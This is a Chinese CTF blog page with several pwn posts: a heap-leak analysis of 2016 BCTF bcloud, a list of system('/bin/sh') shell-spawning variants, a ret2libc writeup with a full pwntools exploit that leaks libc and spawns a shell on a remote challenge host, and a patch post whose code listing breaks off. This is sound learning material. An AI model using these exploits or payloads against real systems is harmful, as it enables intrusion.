            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:29:38" itemprop="dateModified" datetime="2019-10-30T17:29:38+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn-heap-learn-10"><a href="#pwn-heap-learn-10" class="headerlink" title="pwn-heap-learn-10"></a>pwn-heap-learn-10</h1><h2 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a>2016 BCTF bcloud</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>我自己找洞：<br>发现写的读取函数出现了off-by-one，然而他用malloc(size+0x4)解决了<br>。。。似乎没了？？<br>凉了，又不会做<br>看了wp后发觉初始化名字部分出现了洞，通常这里不会设置洞的。。<br>然后。。。我看了wp居然还是看不出他为啥子能泄露。。。<br>自己调试呗</p>
<p>。。。网上讲解都说name初始化哪里有leak的洞。。。然而我看了好久没发觉，只看出了个off-by-one???<br>最后调试才测试出来，这off-by-one刚好被那个执行顺序刚好缓解了。。。真的烦。。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">init_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  read_str(&amp;s, <span class="number">0x40</span>, <span class="string">'\n'</span>);</span><br><span class="line">  tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, &amp;s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Init_name这里，他read_str这里，实际是溢出了一个字节，覆盖到了tmp部分，然后tmp是在在后面malloc的，所以会覆盖掉这个空字节。。。所以实际上就是下图过程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20wx 0xffbe473c-0x40</span><br><span class="line">0xffbe46fc:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe470c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe471c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe472c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe473c:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0xffbe46fc</span><br><span class="line">0xffbe46fc:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe470c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe471c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe472c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe473c:	0x000000000953e008	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>初始输入放到栈s处，然后只有输入的，在malloc过后，就多了个指针，所以strcpy的时候会多复制一个指针，至于有时候会失败，是因为malloc出来的堆地址刚好是对齐了00，所以strcpy遇到’\x00’就停止了，所以这时候复制就会将堆地址也复制过去，进而泄露堆地址</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-system_all/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-system_all/" class="post-title-link" itemprop="url">pwn细节</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:32:45" itemprop="dateModified" datetime="2019-10-30T17:32:45+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E7%BB%86%E8%8A%82/" itemprop="url" rel="index">
                    <span itemprop="name">细节</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>133</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li>system(“/bin/sh”)</li>
<li>system(“sh”)</li>
<li>system(“/bin/bash”)</li>
<li>system(“bash”)</li>
<li>system(“$0”)</li>
</ol>
<p>若还不成，可试试在参数后面加;#<br>比如system(“/bin/sh;#”)<br>这是由于函数的特殊性，有些函数会截断特殊字符</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-writeup/" class="post-title-link" itemprop="url">国赛pwn01</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:33:21" itemprop="dateModified" datetime="2019-10-30T17:33:21+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E6%A0%88/" itemprop="url" rel="index">
                    <span itemprop="name">栈</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn-01"><a href="#pwn-01" class="headerlink" title="pwn-01"></a>pwn-01</h1><p>题目不难，很明显能看出ROP</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets没有限制长度，然后有个麻烦的地方就是对payload进行了一轮加密操作，然后过了这部分后，还要记住他是64位程序，用寄存器传前5个还是前6个参数来着，忘了，不重要，不过确定的是第一位是用的rdi，所以需要<br>ROPgadget –binary Emachine –only ‘pop|ret’<br>然后找到那个地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└──╼ <span class="variable">$ROPgadget</span> --binary Emachine --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>

<p>然后加密部分在加密一次就完了，异或加密可逆</p>
<h2 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="keyword">if</span> ord(payload[x]) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(payload[x]) &lt;=<span class="number">64</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(payload[x]) &gt; <span class="number">47</span> <span class="keyword">and</span> ord(payload[x]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    result += chr(ord(payload[x]) ^ <span class="number">0xf</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += payload[x]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += chr(ord(payload[x]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += chr(ord(payload[x]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"><span class="comment">#io = process("./Emachine")</span></span><br><span class="line">io = remote(<span class="string">"172.29.14.110"</span>, <span class="number">8888</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Emachine'</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">start = <span class="number">0x0000000000400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">__libc_start_main_plt = elf.plt[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure>
<p>初始化部分，offset是0x58，本地是和远程libc不一样</p>
<h2 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(puts_plt)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_got)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_plt)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#encrypt</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    payload = p64(__libc_start_main_got<span class="number">-1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*offset +  p64(pop_rdi) + p64(__libc_start_main_got<span class="number">-1</span>) + p64(puts_plt) +  p64(<span class="number">0x0000000000400B28</span>) </span><br><span class="line">    payload = Decrypt(payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"Ciphertext\n"</span>)</span><br><span class="line">    <span class="comment">#print "io.recv =" + io.recv()</span></span><br><span class="line">    <span class="comment">#io.sendline("1")</span></span><br><span class="line">    <span class="comment">#result = io.recvuntil("\nE", drop= True)[-8:]</span></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = u64(result[:<span class="number">-1</span>]+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#泄露libc地址</span></span><br><span class="line">    <span class="keyword">print</span> hex(result)</span><br><span class="line"></span><br><span class="line">    __libc_start_main_addr = result</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'a'</span>*offset  + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment">#print "addr " + hex(u64(io.recv(8)))</span></span><br><span class="line">    <span class="comment">#print hex(u64(io.recv(8)))</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print len(io.recv(8))</span></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<p>直接把payload 进行一次加密就完了，然后进行正常的ROP就完了，pop_rdi, 将__libc_start_got pop到rdi里，然后puts就是puts got，然后返回地址就是0x0000000000400B28<br>泄露过后，我这里进行调试了很多遍，才知道如何接受那个字符串，就是泄露的libc_start_main地址</p>
<p>接受成功后，就是在pop bin_sh 然后执行system函数就完了，</p>
<p>现在写writeup的时候，发觉有更简单的办法，加密函数根本不用管，我原来错的只是寄存器传参的问题，因为我发觉我后面传payload的时候忘了加密也成了。。。。<br>所以。。。原来是简单题，被我做复杂了。。。<br>只是一个在简单不过的ret2libc??</p>
<p>还有个内网我无法下载libc。。。幸亏我特么本机存了ctf-wiki的libc，那个题目的libc直接打成了是libc2.23.so<br>好像后面的题目也给了libc，直接下载也成吧<br>以后要正确区分64位程序跟32位程序区别，这次踩了好久的坑</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-writeup1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-writeup1/" class="post-title-link" itemprop="url">国赛pwn修复1</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:34:13" itemprop="dateModified" datetime="2019-10-30T17:34:13+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E6%A0%88/" itemprop="url" rel="index">
                    <span itemprop="name">栈</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>#修复部分</p>
<p>题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 